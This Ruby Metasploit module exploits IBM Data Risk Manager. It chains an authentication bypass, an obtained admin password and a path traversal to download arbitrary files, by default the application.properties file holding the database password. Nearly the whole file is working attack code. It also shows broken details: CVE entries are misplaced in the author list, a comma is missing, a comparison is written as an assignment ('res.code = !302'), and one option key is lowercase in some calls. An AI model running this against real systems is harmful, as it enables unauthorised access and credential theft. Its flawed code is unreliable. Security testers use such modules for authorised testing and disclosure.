##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'zip'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'IBM Data Risk Manager Arbitrary File Download',
        'Description' => %q{
          IBM Data Risk Manager (IDRM) contains two vulnerabilities that can be chained by
          an unauthenticated attacker to download arbitrary files off the system.
          The first is an unauthenticated bypass, followed by a path traversal.
          This module exploits both vulnerabilities, giving an attacker the ability to download (non-root) files.
          A downloaded file is zipped, and this module also unzips it before storing it in the database.
          By default this module downloads Tomcat's application.properties files, which contains the
          database password, amongst other sensitive data.
          At the time of disclosure, this is a 0 day. Versions 2.0.3 and 2.0.2 are confirmed to be
          affected, and the latest 2.0.6 is most likely affected too. Version 2.0.1 is not vulnerable.
        },
        'Author' =>
          [
            'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and Metasploit module
            [ 'CVE', '2020-4427' ],   # auth bypass
            [ 'CVE', '2020-4429' ],   # insecure default password            
          ],
        'License' => MSF_LICENSE,
        'References' =>
          [
            [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md' ],
          ],
        'DisclosureDate' => 'Apr 21 2020'
      )
    )

    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 8443]),
        OptBool.new('SSL', [true, 'Connect with TLS', true]),
        OptString.new('TARGETURI', [ true, 'Default server path', '/']),
        OptString.new('FILEPATH', [
          false, 'Path of the file to download',
          '/home/a3user/Tomcat/webapps/albatross/WEB-INF/classes/application.properties'
        ]),
      ]
    )
  end

  def check
    # at the moment there is no better way to detect AND be stealthy about it
    session_id = Rex::Text.rand_text_alpha(5..12)
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'saml', 'idpSelection'),
      'method' => 'GET',
      'vars_get' => {
        'id' => session_id,
        'userName' => 'admin'
      }
    })
    if res && (res.code == 302)
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Unknown
  end

  def run
    # step 1: create a session ID and try to make it stick
    session_id = Rex::Text.rand_text_alpha(5..12)
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'saml', 'idpSelection'),
      'method' => 'GET',
      'vars_get' => {
        'id' => session_id,
        'userName' => 'admin'
      }
    })
    if res && (res.code = !302)
      fail_with(Failure::Unknown, "#{peer} - Failed to \"stick\" session ID")
    else
      print_good("#{peer} - Successfully \"stickied\" our session ID #{session_id}")
    end

    # step 2: give the session ID to the server and have it grant us a free admin password
    post_data = Rex::MIME::Message.new
    post_data.add_part('', nil, nil, content_disposition = 'form-data; name="deviceid"')
    post_data.add_part(Rex::Text.rand_text_alpha(8..15), nil, nil, content_disposition = 'form-data; name="password"')
    post_data.add_part('admin', nil, nil, content_disposition = 'form-data; name="username"')
    post_data.add_part('', nil, nil, content_disposition = 'form-data; name="clientDetails"')
    post_data.add_part(session_id, nil, nil, content_disposition = 'form-data; name="sessionId"')

    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'user', 'login'),
      'method' => 'POST',
      'data' => post_data.to_s,
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
    })
    if res && (res.code == 200) && res.body[/\"data\":\"([0-9a-f\-]{36})/]
      password = Regexp.last_match(1)
      print_good("#{peer} - We have obtained a new admin password #{password}")
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to obtain the admin password.")
    end

    # step 3: login and get an authenticated cookie
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['targeturi'], 'albatross', 'login'),
      'method' => 'POST',
      'vars_post' => {
        'userName' => 'admin',
        'password' => password
      }
    })
    if res && (res.code == 302) && res.get_cookies
      print_good("#{peer} - We're now authenticated as admin!")
      cookie = res.get_cookies
      url = res.redirection.to_s

      # step 4: obtain csrf header in order to be able to make valid requests
      res = send_request_cgi({
        'uri' => url,
        'method' => 'GET',
        'cookie' => cookie
      })
      if res && (res.code == 200) && res.body =~ /var csrfToken \= \"([0-9a-f\-]{36})\";/
        # step 5: download the file!
        csrf = Regexp.last_match(1)
        post_data = %({"instanceId":"local_host","logLevel":"DEBUG","logFileNameList":"../../../../..#{datastore['FILEPATH']}"})

        res = send_request_cgi({
          'uri' => normalize_uri(datastore['targeturi'], 'albatross', 'eurekaservice', 'fetchLogFiles'),
          'method' => 'POST',
          'cookie' => cookie,
          'headers' => { 'CSRF-TOKEN' => csrf },
          'data' => post_data.to_s,
          'ctype' => 'text/json'
        })

        if res && (res.code == 200) && !res.body.empty?
          Zip::File.open_buffer(res.body) do |zipfile|
            # Not sure what happens if we receive garbage that's not a ZIP file, but that shouldn't
            # happen? Either we get nothing or a proper zip file.
            file = zipfile.find_entry(File.basename(datastore['FILEPATH']))
            if file
              filedata = zipfile.read(file)
              vprint_line(filedata.to_s)
              fname = File.basename(datastore['FILEPATH'])

              path = store_loot(
                'IBM_DRM.http',
                'application/octet-stream',
                datastore['RHOST'],
                filedata,
                fname
              )
              print_good("File saved in: #{path}")
            else
              fail_with(Failure::Unknown, "#{peer} - Incorrect file downloaded!")
            end
          end
        else
          fail_with(Failure::Unknown, "#{peer} - Failed to download file #{datastore['FILEPATH']}")
        end
      else
        fail_with(Failure::Unknown, "#{peer} - Failed to obtain authenticated CSRF cookie.")
      end
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to authenticate as admin.")
    end
  end
end
